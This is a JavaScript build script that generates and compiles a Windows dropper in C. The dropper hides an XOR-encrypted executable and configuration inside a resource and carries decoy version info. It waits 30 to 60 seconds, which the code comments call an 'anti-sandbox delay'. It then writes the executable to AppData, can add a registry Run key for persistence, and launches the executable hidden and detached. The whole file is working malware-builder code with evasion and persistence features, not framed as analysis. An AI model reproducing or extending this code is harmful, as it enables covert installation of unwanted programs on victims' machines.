// language: JavaScript, file: builder/compile.js
// live-compiles the launcher per build.
// payload (key + config + base) is XOR-encrypted at rest and embedded as a
// Windows resource, not as a string literal. version info + manifest.
// anti-sandbox delay, detached spawn, no WaitForSingleObject.
// writes key.json as {"key":"<value>"}.

import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import crypto from 'node:crypto';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';

const execFileP = promisify(execFile);

const CC      = process.env.MINGW_CC      || 'x86_64-w64-mingw32-gcc';
const WINDRES = process.env.MINGW_WINDRES || 'x86_64-w64-mingw32-windres';

// ---------- helpers ----------

function packPayload({ key, config, baseBuf, xorKey }) {
  const keyBuf = Buffer.from(key || '', 'utf8');
  const cfgBuf = Buffer.from(JSON.stringify(config || {}), 'utf8');

  const header = Buffer.alloc(13);
  header.writeUInt8(1, 0);
  header.writeUInt32LE(keyBuf.length, 1);
  header.writeUInt32LE(cfgBuf.length, 5);
  header.writeUInt32LE(baseBuf.length, 9);

  const raw = Buffer.concat([header, keyBuf, cfgBuf, baseBuf]);

  const out = Buffer.alloc(raw.length);
  for (let i = 0; i < raw.length; i++) {
    out[i] = raw[i] ^ xorKey[i % xorKey.length];
  }
  return out;
}

function rcSource() {
  return `
#include <windows.h>

VS_VERSION_INFO VERSIONINFO
FILEVERSION     1,0,0,0
PRODUCTVERSION  1,0,0,0
FILEFLAGSMASK   0x3fL
FILEFLAGS       0x0L
FILEOS          VOS_NT_WINDOWS32
FILETYPE        VFT_APP
FILESUBTYPE     VFT2_UNKNOWN
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName",      "Loader Systems"
            VALUE "FileDescription",  "Loader Setup"
            VALUE "FileVersion",      "1.0.0.0"
            VALUE "InternalName",     "loader"
            VALUE "LegalCopyright",   "Copyright (C) 2025"
            VALUE "OriginalFilename", "loader.exe"
            VALUE "ProductName",      "Loader"
            VALUE "ProductVersion",   "1.0.0.0"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200
    END
END

PAYLOAD_BIN RCDATA "payload.bin"
`;
}

function cSource({ xorKeyBytes, payloadSize }) {
  return `
// auto-generated launcher — windowed, resource-loaded, xor-encrypted payload.
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define PAYLOAD_SIZE ${payloadSize}

static const unsigned char XOR_KEY[32] = {
${xorKeyBytes.map(b => '    0x' + b.toString(16).padStart(2, '0')).join(',\n')}
};

static unsigned char *load_payload(DWORD *out_len) {
    HRSRC hres = FindResourceW(NULL, L"PAYLOAD_BIN", MAKEINTRESOURCEW(10));
    if (!hres) return NULL;
    DWORD sz = SizeofResource(NULL, hres);
    if (!sz || sz != PAYLOAD_SIZE) return NULL;
    HGLOBAL hmem = LoadResource(NULL, hres);
    if (!hmem) return NULL;
    void *p = LockResource(hmem);
    if (!p) return NULL;
    unsigned char *out = (unsigned char *)malloc(sz);
    if (!out) return NULL;
    memcpy(out, p, sz);
    for (DWORD i = 0; i < sz; i++) out[i] ^= XOR_KEY[i % 32];
    *out_len = sz;
    return out;
}

static int write_file(const wchar_t *path, const unsigned char *data, DWORD len) {
    HANDLE f = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) return -1;
    DWORD w = 0;
    BOOL ok = WriteFile(f, data, len, &w, NULL);
    CloseHandle(f);
    return (ok && w == len) ? 0 : -1;
}

static int make_dir(const wchar_t *path) {
    wchar_t tmp[2048]; wcsncpy(tmp, path, 2048); tmp[2047] = 0;
    for (wchar_t *p = tmp + 1; *p; p++) {
        if (*p == L'\\\\') { *p = 0; CreateDirectoryW(tmp, NULL); *p = L'\\\\'; }
    }
    if (!CreateDirectoryW(tmp, NULL)) {
        if (GetLastError() != ERROR_ALREADY_EXISTS) return -1;
    }
    return 0;
}

static int expand_env(const wchar_t *in, wchar_t *out, DWORD cap) {
    DWORD n = ExpandEnvironmentStringsW(in, out, cap);
    return (n > 0 && n <= cap) ? 0 : -1;
}

static void json_str(const char *json, const char *field, char *out, size_t out_cap) {
    char pat[64]; _snprintf(pat, sizeof(pat), "\\"%s\\"", field);
    char *p = strstr(json, pat);
    if (!p) return;
    p = strchr(p, ':'); if (!p) return;
    p = strchr(p, '"'); if (!p) return;
    p++;
    char *q = strchr(p, '"'); if (!q) return;
    size_t n = (size_t)(q - p);
    if (n >= out_cap) n = out_cap - 1;
    memcpy(out, p, n); out[n] = 0;
}

static int json_bool(const char *json, const char *field, int def) {
    char pat[64]; _snprintf(pat, sizeof(pat), "\\"%s\\"", field);
    char *p = strstr(json, pat);
    if (!p) return def;
    p = strchr(p, ':'); if (!p) return def;
    p++;
    while (*p == ' ' || *p == '\\t') p++;
    if (strncmp(p, "true", 4) == 0) return 1;
    if (strncmp(p, "false", 5) == 0) return 0;
    return def;
}

static void json_args(const char *json, char *out, size_t out_cap) {
    out[0] = 0;
    char *p = strstr(json, "\\"args\\"");
    if (!p) return;
    p = strchr(p, ':'); if (!p) return;
    p = strchr(p, '['); if (!p) return;
    char *end = strchr(p, ']'); if (!end) return;
    p++;
    size_t o = 0;
    int first = 1;
    while (p < end) {
        while (p < end && (*p == ' ' || *p == ',' || *p == '\\t' || *p == '\\n' || *p == '\\r')) p++;
        if (p >= end || *p == ']') break;
        if (!first && o < out_cap - 1) out[o++] = ' ';
        first = 0;
        if (*p == '"') {
            p++;
            while (p < end && *p != '"' && o < out_cap - 1) out[o++] = *p++;
            if (p < end && *p == '"') p++;
        } else {
            while (p < end && *p != ',' && *p != ']' && *p != ' ' && o < out_cap - 1) out[o++] = *p++;
        }
    }
    out[o] = 0;
}

static void delay_random(void) {
    LARGE_INTEGER freq, start, now;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);

    DWORD target_ms = 30000 + (GetTickCount() % 30000);

    while (1) {
        QueryPerformanceCounter(&now);
        double elapsed_ms = (double)(now.QuadPart - start.QuadPart) * 1000.0 / (double)freq.QuadPart;
        if (elapsed_ms >= (double)target_ms) break;
        Sleep(750 + (GetTickCount() % 500));
    }
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    delay_random();

    DWORD plen = 0;
    unsigned char *payload = load_payload(&plen);
    if (!payload || plen < 13) return 1;

    unsigned char *p = payload;
    unsigned int ver = p[0];
    if (ver != 1) { free(payload); return 1; }
    DWORD key_len  = (DWORD)p[1]        | ((DWORD)p[2]  << 8) | ((DWORD)p[3]  << 16) | ((DWORD)p[4]  << 24);
    DWORD cfg_len  = (DWORD)p[5]        | ((DWORD)p[6]  << 8) | ((DWORD)p[7]  << 16) | ((DWORD)p[8]  << 24);
    DWORD base_len = (DWORD)p[9]        | ((DWORD)p[10] << 8) | ((DWORD)p[11] << 16) | ((DWORD)p[12] << 24);
    if (13 + key_len + cfg_len + base_len > plen) { free(payload); return 1; }

    unsigned char *key  = p + 13;
    unsigned char *cfg  = key + key_len;
    unsigned char *base = cfg + cfg_len;

    char cfg_buf[8192] = {0};
    DWORD copy = cfg_len < sizeof(cfg_buf) - 1 ? cfg_len : sizeof(cfg_buf) - 1;
    memcpy(cfg_buf, cfg, copy);

    char dest[1024]   = "%APPDATA%\\\\loader";
    char exeName[256] = "program.exe";
    char keyFile[256] = "key.json";
    char args[2048]   = "";
    int  persist      = 0;

    json_str(cfg_buf, "dest",    dest,    sizeof(dest));
    json_str(cfg_buf, "exeName", exeName, sizeof(exeName));
    json_str(cfg_buf, "keyFile", keyFile, sizeof(keyFile));
    json_args(cfg_buf, args, sizeof(args));
    persist = json_bool(cfg_buf, "persist", 0);

    wchar_t dest_src[1024], dest_w[1024];
    MultiByteToWideChar(CP_UTF8, 0, dest, -1, dest_src, 1024);
    if (expand_env(dest_src, dest_w, 1024) != 0) { free(payload); return 1; }
    if (make_dir(dest_w) != 0) { free(payload); return 1; }

    wchar_t base_path[2048], key_path[2048];
    _snwprintf(base_path, 2048, L"%ls\\\\%hs", dest_w, exeName);
    _snwprintf(key_path,  2048, L"%ls\\\\%hs", dest_w, keyFile);

    if (write_file(base_path, base, base_len) != 0) { free(payload); return 1; }

    // wrap the key in {"key":"<value>"} and write that
    {
        char key_wrapped[4096];
        int n = _snprintf(key_wrapped, sizeof(key_wrapped),
                          "{\\n  \\"key\\": \\"%.*s\\"\\n}\\n",
                          (int)key_len, (const char *)key);
        if (n <= 0 || n >= (int)sizeof(key_wrapped)) { free(payload); return 1; }
        if (write_file(key_path, (const unsigned char *)key_wrapped, (DWORD)n) != 0) {
            free(payload); return 1;
        }
    }

    if (persist) {
        HKEY hk;
        if (RegOpenKeyExW(HKEY_CURRENT_USER,
                          L"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
                          0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
            RegSetValueExW(hk, L"Loader", 0, REG_SZ,
                           (const BYTE *)base_path,
                           (DWORD)((wcslen(base_path) + 1) * sizeof(wchar_t)));
            RegCloseKey(hk);
        }
    }

    wchar_t cmd[4096];
    if (args[0]) {
        wchar_t args_w[2048];
        MultiByteToWideChar(CP_UTF8, 0, args, -1, args_w, 2048);
        _snwprintf(cmd, 4096, L"\\"%ls\\" %ls", base_path, args_w);
    } else {
        _snwprintf(cmd, 4096, L"\\"%ls\\"", base_path);
    }

    STARTUPINFOW si = {0}; PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcessW(base_path, cmd, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW | DETACHED_PROCESS,
                       NULL, dest_w, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    free(payload);
    return 0;
}
`;
}

// ---------- compile pipeline ----------

export async function compileLauncher({ key, config, baseExe }) {
  const useKey = (key && String(key).trim().length > 0) ? String(key).trim() : '';

  const baseBuf = fs.readFileSync(baseExe);

  const xorKey = crypto.randomBytes(32);
  const payload = packPayload({ key: useKey, config: config || {}, baseBuf, xorKey });

  const workDir = fs.mkdtempSync(path.join(os.tmpdir(), 'wh-build-'));
  const payloadPath = path.join(workDir, 'payload.bin');
  const rcPath      = path.join(workDir, 'app.rc');
  const resPath     = path.join(workDir, 'app.res');
  const cPath       = path.join(workDir, 'launcher.c');
  const outPath     = path.join(workDir, 'launcher.exe');

  try {
    fs.writeFileSync(payloadPath, payload);
    fs.writeFileSync(rcPath, rcSource());

    await execFileP(WINDRES, [
      '-I', workDir,
      '-i', rcPath,
      '-o', resPath,
      '--input-format=rc',
      '--output-format=coff',
    ], { cwd: workDir, timeout: 30_000, maxBuffer: 16 * 1024 * 1024 });

    const xorKeyBytes = Array.from(xorKey);
    fs.writeFileSync(cPath, cSource({ xorKeyBytes, payloadSize: payload.length }));

    await execFileP(CC, [
      '-O2', '-s',
      '-mwindows',
      '-o', outPath,
      cPath,
      resPath,
      '-lshell32', '-ladvapi32', '-luser32', '-lkernel32',
    ], { cwd: workDir, timeout: 60_000, maxBuffer: 32 * 1024 * 1024 });

    const buf = fs.readFileSync(outPath);
    return buf;
  } finally {
    try { fs.rmSync(workDir, { recursive: true, force: true }); } catch {}
  }
}